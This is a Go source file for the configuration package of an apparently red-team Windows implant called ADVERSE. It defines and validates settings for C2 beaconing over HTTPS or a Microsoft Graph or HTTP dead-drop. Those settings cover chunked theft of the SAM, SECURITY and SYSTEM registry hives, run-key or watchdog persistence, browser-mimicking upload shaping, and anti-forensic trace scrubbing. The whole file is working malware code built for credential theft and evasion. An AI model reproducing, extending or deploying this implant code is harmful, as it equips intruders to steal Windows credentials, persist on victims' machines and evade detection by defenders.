// Package agent implements the ADVERSE Windows client lifecycle: config
// loading/validation, hello handshake, beacon loop, task dispatch, result
// delivery, kill handling, and retry/backoff.
//
// The agent communicates with the C2 server via HTTPS POST using the v2
// wire envelope (wire.Build/Parse) with ChaCha20-Poly1305 authenticated
// encryption.
package agent

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// DropAuth is the optional authentication for the drop store.
type DropAuth struct {
	Type      string `json:"type"` // "basic" | "bearer" | ""
	Username  string `json:"username"`
	Password  string `json:"password"`
	BearerEnv string `json:"bearer_env"` // env var holding the bearer token
}

// DropConfig configures the dead-drop transport (transport.mode = "drop").
type DropConfig struct {
	Store            string   `json:"store"`    // "http" | "graph"
	BaseURL          string   `json:"base_url"` // http store root URL
	Auth             DropAuth `json:"auth"`
	TenantID         string   `json:"tenant_id"`          // graph
	ClientID         string   `json:"client_id"`          // graph
	ClientSecret     string   `json:"client_secret"`      // graph (prefer ClientSecretEnv)
	ClientSecretEnv  string   `json:"client_secret_env"`  // graph
	UserUPN          string   `json:"user_upn"`           // graph
	Dir              string   `json:"dir"`                // folder prefix under the store root
	PollIntervalS    int      `json:"poll_interval_s"`    // agent poll cadence
	ResponseTimeoutS int      `json:"response_timeout_s"` // agent response deadline
}

// TransportConfig selects the C2 channel. Absent => "https".
type TransportConfig struct {
	Mode       string     `json:"mode"` // "https" | "drop"
	Drop       DropConfig `json:"drop"`
	SleepMode  string     `json:"sleep_mode"`  // "runtime" | "timer" (Windows waitable timer)
	JitterSeed string     `json:"jitter_seed"` // optional hex seed for deterministic jitter (tests)
}

// PersistenceConfig configures bounded agent persistence. Mode is one of
// "" (treated the same as "none"), "none", "watchdog", "runkey", or "both".
type PersistenceConfig struct {
	Mode       string `json:"mode"`
	RunKeyName string `json:"run_key_name"`
}

// SpoolConfig configures the encrypted durable chunk spool. Dir defaults to
// spool.DefaultDir(agentID) when empty.
type SpoolConfig struct {
	Enabled bool   `json:"enabled"`
	Dir     string `json:"dir,omitempty"`
}

// ShapingConfig configures browser-like upload traffic shaping.
type ShapingConfig struct {
	Enabled        bool `json:"enabled"`
	UploadJitterMs int  `json:"upload_jitter_ms"`
}

// AntiForensicConfig configures best-effort trace scrubbing at teardown.
type AntiForensicConfig struct {
	ScrubTraces bool `json:"scrub_traces"`
}

// Config is the agent configuration, matching the exact JSON schema.
type Config struct {
	AgentID    string   `json:"agent_id"`
	Secret     string   `json:"secret"`
	ServerURL  string   `json:"server_url"`
	SignPubHex string   `json:"sign_pub_hex"`
	Hives      []string `json:"hives"`
	ChunkSize  int      `json:"chunk_size"`
	MinDelayMs int      `json:"min_delay_ms"`
	MaxDelayMs int      `json:"max_delay_ms"`
	RealMode   bool     `json:"real_mode"`
	UserAgent  string   `json:"user_agent"`
	// TLSSkipVerify disables TLS certificate verification. Required when the
	// server uses a self-signed ephemeral cert (lab deployments). Default false.
	TLSSkipVerify bool `json:"tls_skip_verify"`
	// Transport selects the C2 channel (https default, or drop).
	Transport TransportConfig `json:"transport"`
	// Persistence arms bounded persistence once extraction has succeeded.
	Persistence PersistenceConfig `json:"persistence"`
	// Spool enables the encrypted durable chunk spool.
	Spool SpoolConfig `json:"spool"`
	// Shaping shapes upload traffic with browser-plausible headers and pacing.
	Shaping ShapingConfig `json:"shaping"`
	// AntiForensic scrubs agent traces at final teardown.
	AntiForensic AntiForensicConfig `json:"anti_forensic"`
	// ExitAfterDelivery ends the run (exit 0) once every extract job has been
	// server-confirmed complete and no spooled jobs remain. Default false;
	// self-contained stubs default it true.
	ExitAfterDelivery bool `json:"exit_after_delivery"`
	// ConfigPath is the filesystem path the config was loaded from (for state file location).
	// Not serialized to JSON.
	ConfigPath string `json:"-"`
}

// TransportMode returns the effective transport mode ("https" default).
func (c *Config) TransportMode() string {
	if c.Transport.Mode == "" {
		return "https"
	}
	return c.Transport.Mode
}

var hexRe = regexp.MustCompile(`^[0-9a-fA-F]+$`)

// Validate checks the configuration for validity.
func (c *Config) Validate() error {
	if len(c.AgentID) != 8 || !hexRe.MatchString(c.AgentID) {
		return fmt.Errorf("agent_id must be 8 hex chars, got %q", c.AgentID)
	}
	if len(c.Secret) != 64 || !hexRe.MatchString(c.Secret) {
		// Never interpolate the secret value (or any substring of it): this
		// error is logged by cmd/registryfil on startup. Report shape only.
		return fmt.Errorf("secret must be 64 hex chars, got len=%d valid_hex=%v", len(c.Secret), hexRe.MatchString(c.Secret))
	}
	if c.ServerURL == "" {
		return fmt.Errorf("server_url must not be empty")
	}
	// Transport validation: https is default; drop requires a concrete store.
	switch c.TransportMode() {
	case "https":
		// ServerURL already checked.
	case "drop":
		dc := c.Transport.Drop
		switch dc.Store {
		case "http":
			if dc.BaseURL == "" {
				return fmt.Errorf("transport.drop.base_url must not be empty for store http")
			}
			if dc.Auth.Type != "" && dc.Auth.Type != "basic" && dc.Auth.Type != "bearer" {
				return fmt.Errorf("transport.drop.auth.type must be basic or bearer, got %q", dc.Auth.Type)
			}
		case "graph":
			if dc.TenantID == "" || dc.ClientID == "" || dc.UserUPN == "" {
				return fmt.Errorf("transport.drop requires tenant_id, client_id, user_upn for store graph")
			}
			if dc.ClientSecret == "" && dc.ClientSecretEnv == "" {
				return fmt.Errorf("transport.drop requires client_secret or client_secret_env for store graph")
			}
		default:
			return fmt.Errorf("transport.drop.store must be http or graph, got %q", dc.Store)
		}
	default:
		return fmt.Errorf("transport.mode must be https or drop, got %q", c.TransportMode())
	}
	if c.Transport.SleepMode != "" && c.Transport.SleepMode != "runtime" && c.Transport.SleepMode != "timer" {
		return fmt.Errorf("transport.sleep_mode must be runtime or timer, got %q", c.Transport.SleepMode)
	}
	if len(c.SignPubHex) != 64 || !hexRe.MatchString(c.SignPubHex) {
		return fmt.Errorf("sign_pub_hex must be 64 hex chars, got %q (len=%d)", c.SignPubHex, len(c.SignPubHex))
	}
	if len(c.Hives) == 0 {
		return fmt.Errorf("hives must not be empty")
	}
	validHives := map[string]bool{
		"SYSTEM": true, "SAM": true, "SECURITY": true, "SOFTWARE": true, "NTUSER.DAT": true,
	}
	for _, h := range c.Hives {
		if !validHives[h] {
			return fmt.Errorf("invalid hive: %s", h)
		}
	}
	if c.ChunkSize <= 0 || c.ChunkSize > 512*1024 {
		return fmt.Errorf("chunk_size must be in (0, 512KB], got %d", c.ChunkSize)
	}
	if c.MinDelayMs < 0 || c.MaxDelayMs < 0 {
		return fmt.Errorf("delay values must be non-negative")
	}
	if c.MinDelayMs > c.MaxDelayMs {
		return fmt.Errorf("min_delay_ms (%d) must be <= max_delay_ms (%d)", c.MinDelayMs, c.MaxDelayMs)
	}
	// Persistence config is fail-closed on the mode value only: an unknown
	// mode is rejected rather than silently disabling an operator-requested
	// capability. Active modes are allowed without real_mode because arming is
	// gated at runtime (armPersistence requires real_mode); a synthetic-mode
	// stub therefore carries an inert persistence setting.
	switch c.Persistence.Mode {
	case "", "none", "watchdog", "runkey", "both":
	default:
		return fmt.Errorf("persistence.mode must be none, watchdog, runkey, or both, got %q", c.Persistence.Mode)
	}
	if c.Spool.Dir != "" && !isAbsPathPortable(c.Spool.Dir) {
		return fmt.Errorf("spool.dir must be an absolute path when set, got %q", c.Spool.Dir)
	}
	if c.Shaping.UploadJitterMs < 0 || c.Shaping.UploadJitterMs > 60000 {
		return fmt.Errorf("shaping.upload_jitter_ms must be in [0, 60000], got %d", c.Shaping.UploadJitterMs)
	}
	return nil
}

// isAbsPathPortable reports whether p is absolute under POSIX or Windows
// rules. Configs are generated on one host and validated on another, so a
// Windows spool directory must not be rejected by a POSIX build (or vice
// versa).
func isAbsPathPortable(p string) bool {
	if filepath.IsAbs(p) {
		return true
	}
	if len(p) >= 3 && p[1] == ':' && (p[2] == '\\' || p[2] == '/') &&
		((p[0] >= 'a' && p[0] <= 'z') || (p[0] >= 'A' && p[0] <= 'Z')) {
		return true
	}
	return strings.HasPrefix(p, `\\`)
}

// LoadConfig loads configuration from a JSON file.
func LoadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read config: %w", err)
	}
	cfg := &Config{}
	if err := json.Unmarshal(data, cfg); err != nil {
		return nil, fmt.Errorf("parse config: %w", err)
	}
	cfg.ConfigPath = path
	return cfg, nil
}

// StateFile tracks persistent state (lastAcceptedEpoch).
type StateFile struct {
	LastAcceptedEpoch uint64 `json:"last_accepted_epoch"`
	path              string
}

// LoadStateFile loads state from the config's directory.
func LoadStateFile(configPath string) (*StateFile, error) {
	dir := filepath.Dir(configPath)
	path := filepath.Join(dir, ".agent_state.json")
	sf := &StateFile{path: path}

	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return sf, nil
		}
		return nil, fmt.Errorf("read state: %w", err)
	}
	if err := json.Unmarshal(data, sf); err != nil {
		return nil, fmt.Errorf("parse state: %w", err)
	}
	return sf, nil
}

// Save persists state to disk (0600 permissions).
func (sf *StateFile) Save() error {
	data, err := json.Marshal(sf)
	if err != nil {
		return err
	}
	return os.WriteFile(sf.path, data, 0600)
}

// Remove deletes the persisted state file. It is idempotent: a missing file is
// success. It must only be called at final teardown (delivery complete,
// accepted kill, or TTL stop), never while the signed-kill replay floor is
// still needed across a watchdog relaunch.
func (sf *StateFile) Remove() error {
	if sf == nil || sf.path == "" {
		return nil
	}
	if err := os.Remove(sf.path); err != nil && !os.IsNotExist(err) {
		return err
	}
	return nil
}

// MinMaxDelay returns the min and max delay as time.Duration.
func (c *Config) MinMaxDelay() (time.Duration, time.Duration) {
	return time.Duration(c.MinDelayMs) * time.Millisecond,
		time.Duration(c.MaxDelayMs) * time.Millisecond
}
